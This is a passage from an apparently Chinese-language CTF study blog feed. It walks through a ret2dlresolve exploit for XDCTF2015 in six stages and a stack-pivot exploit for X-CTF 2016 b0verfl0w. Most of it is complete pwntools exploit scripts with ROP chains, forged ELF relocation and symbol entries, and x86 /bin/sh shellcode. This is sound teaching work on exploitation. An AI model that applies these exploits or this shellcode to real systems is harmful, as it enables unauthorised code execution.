&quot;pop|ret&quot;，作用是将read的参数弹出恢复堆栈</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary main --only &quot;leave|ret&quot;</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S main | grep &quot;.bss&quot;</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># payload1</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p32(read_plt) <span class="comment"># 读100个字节到base_stage</span></span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret) <span class="comment"># 把base_stage pop到ebp中</span></span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) <span class="comment"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="comment"># payload2</span></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># 因为前面leave_ret以后esp会指向base_stage下一地址，所以这里用无用字符填充</span></span><br><span class="line">payload2 += p32(write_plt)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>payload里面的p32(read_plt)+p32(ppp_ret)+p32(0) +p32(base_stage) +p32(100)构造函数read(0,base_stage,100)作用是向我们伪造数据段的地方写入数据，也就是后面的payload2<img src="https://i.loli.net/2021/10/20/CfVrNBOS4u5PbdT.png" alt="image.png"></p><h2 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h2><p>接下来，用 dlresolve 的知识来调用 write 函数，利用 plt[0] 的相关指令，即公共 plt 表项 push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移，即 write@plt push的那个参数。整个过程相当于调用dl_runtime_resolve 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt main</span></span><br><span class="line">index_offset = <span class="number">0x20</span> <span class="comment"># write&#x27;s index</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/20/ZpWxBQDsMwYjGSl.png" alt="屏幕截图 2021-10-20 170358.png"></p><p>payload2 = p32(plt_0) + p32(index_offset)：利用dl_runtime_resolve 函数的原理找到write函数</p><h2 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h2><p>同样控制 dl_resolve 函数中的 reloc_index 参数，不过这次控制其指向我们伪造的 write 重定位项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt main</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt main</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">28</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/20/5JS1GCKgkpABuaW.png" alt="屏幕截图 2021-10-20 175654.png"></p><p>红色区域是我们伪造的：</p><p><img src="https://i.loli.net/2021/10/21/dZAzhQrnvs1Xj4V.png" alt="image.png"></p><h2 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h2><p>这一次构造fake_sym，使其指向我们控制的st_name。伪造.dynsym的地址fake_sym_addr，通过fake_sym_addr计算出伪造r_info。</p><p>所以payload2运行过程如下：先跳转到公共plt[0]，plt[0]会跳转到地址.dynamic，.dynamic 可以找到.rel.plt ，.rel.plt 的地址加上伪造数据index_offset 可以得到函数重定位表项伪造 的fake_reloc指针，指针中r_info&gt;&gt;8作为.dynsym下标找到name_offset，name_offset加上.dynstr找到write函数名，最后找到对应函数地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment"># 计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">name_offset = <span class="number">0x4c</span> </span><br><span class="line">fake_sym = p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">28</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/21/v5wLUFayZRMO79Q.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment"># 计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数</span></span><br><span class="line">fake_sym = p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)  <span class="comment"># name_offset=4c</span></span><br></pre></td></tr></table></figure><p>这两行代码就是模拟寻找name_offset。原来的流程是r_info&gt;&gt;8作为下标找到.dynsym对应的内容，而这两行代码也是一样，通过假的r_info&gt;&gt;8找到的地址就是我们已经构造的地方，因为由前面可以知道原来的流程是r_info&gt;&gt;8作为下标是6（原来的r_info=0x607），所以fake_sym伪造成第六行即可</p><p><img src="https://i.loli.net/2021/10/24/pfn5x8EUcHJrdLq.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/24/LsKVJZSdBuD51Xn.png" alt="image.png"></p><h2 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h2><p>把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&quot;write\x00&quot;</span>  <span class="comment"># st_name对应的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h2><p>替换<code>write</code>为<code>system</code>，并修改<code>system</code>的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary main --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary main --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -Smain | grep &quot;.bss&quot;</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt main</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt main</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h1><p>还是栈溢出，不过这次除了libc泄露还可以采取stack pivoting，就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。</p><p><img src="https://i.loli.net/2021/10/29/ahAs8u651olBGy3.png" alt="image.png"></p><p>没有开堆栈不可执行，所以可以采取stack pivoting，将ROP写入在栈中，控制eip执行堆栈中的ROP。</p><p><img src="https://i.loli.net/2021/10/29/6NRHrxjc3d9iD2e.png" alt="image.png"></p><p>查找gadgets，发现存在jmp esp，所以可以让eip执行堆栈中的内容。</p><p>编写shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x86 = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>计算偏移。fgets只允许读取50个字节，s总共能存储0x20个字节，也就是溢出50-0x20-4=14字节</p><p><img src="https://i.loli.net/2021/10/29/dYoqVX5sycF4i2G.png" alt="image.png"></p><p>最后编写exp</p><h2 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">payload = shellcode_x86+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode_x86))+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(jmp_esp)+sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fortmat String</title>
      <link href="/post/Fortmat-String.html"/>
      <url>/post/Fortmat-String.html</url>
      
